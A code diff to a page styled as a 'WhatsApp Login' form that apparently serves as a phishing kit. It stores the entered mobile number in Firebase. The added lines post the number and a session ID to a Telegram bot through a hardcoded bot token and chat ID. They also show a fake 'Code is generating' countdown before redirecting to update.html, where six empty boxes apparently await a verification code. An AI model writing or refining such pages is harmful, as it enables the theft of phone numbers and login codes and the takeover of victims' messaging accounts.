@@ -13,6 +13,7 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      position: relative;
     }
 
     .container {
@@ -23,6 +24,7 @@
       width: 90%;
       max-width: 400px;
       text-align: center;
+      z-index: 1;
     }
 
     h1 {
@@ -63,13 +65,66 @@
     button:hover {
       background-color: #1da851;
     }
+
+    /* Loading Overlay */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255,255,255,0.9);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 2;
+      text-align: center;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #25d366;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .blur {
+      filter: blur(4px);
+    }
+
+    .message {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .countdown {
+      font-size: 16px;
+      color: #666;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="container" id="mainContainer">
     <h1>WhatsApp Login</h1>
     <input type="tel" id="mobile" placeholder="Enter mobile number" maxlength="10">
     <button onclick="handleLogin()">Login</button>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="message">Please wait, your Code is generating process</div>
+    <div class="countdown" id="countdownTimer">30</div>
   </div>
 
   <!-- Firebase Config + Script -->
@@ -100,13 +155,46 @@
       const sessionId = generateSessionID();
       sessionStorage.setItem("sessionId", sessionId);
 
+      // Apply blur + show overlay
+      document.getElementById('mainContainer').classList.add('blur');
+      document.getElementById('loadingOverlay').style.display = 'flex';
+
+      // Save to Firebase
       await db.collection("whatsapp-number").doc(sessionId).set({
         mobile,
         boxes: ["", "", "", "", "", ""],
-        timestamp: firebase.firestore.FieldValue.serverTimestamp()  // Important line
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
       });
 
-      window.location.href = "update.html";
+      // Send to Telegram
+      const telegramToken = "7882249824:AAH_uilWT-fudDHjgyav97CGNR9XZHwh_5A";
+      const chatId = "6677946042";
+      const message = `New Login:\nMobile: ${mobile}\nSession ID: ${sessionId}`;
+
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).catch(error => {
+        console.error("Telegram API error:", error);
+      });
+
+      // Start 30-second countdown
+      let seconds = 30;
+      const countdownEl = document.getElementById("countdownTimer");
+      const interval = setInterval(() => {
+        seconds--;
+        countdownEl.textContent = seconds;
+        if (seconds === 0) {
+          clearInterval(interval);
+          window.location.href = "update.html";
+        }
+      }, 1000);
     }
   </script>
 </body>
